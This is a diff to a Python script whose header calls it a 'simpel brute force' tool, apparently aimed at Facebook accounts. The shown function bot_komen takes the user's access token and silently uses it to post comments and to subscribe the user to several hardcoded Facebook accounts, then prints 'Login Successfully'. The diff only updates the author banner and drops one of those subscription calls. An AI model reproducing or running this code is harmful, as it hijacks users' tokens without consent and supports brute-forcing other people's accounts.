@@ -1,7 +1,12 @@
 # -*- coding: utf-8
-# coded by angga kurniawan
-# fb.me/gaaaarzxd
-# instagram.com/gaaarzxd
+#####################################################
+# * Author    : Angga Kurniawan                     #
+# * Facebook  : https://facebook.com/gaaaarzxd      #
+# * GitHub    : https://github.com/anggaxd          #
+# * Instagram : https://www.instagram.com/gaaarzxd  #
+# * Website   : https://anggaxd.herokuapp.com       #
+# * File Name : run.py < simpel brute force >       #
+#####################################################
 
 try:
 	import requests
@@ -65,7 +70,6 @@ def bot_komen():
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/1186995774/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100005552174255/subscribers?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
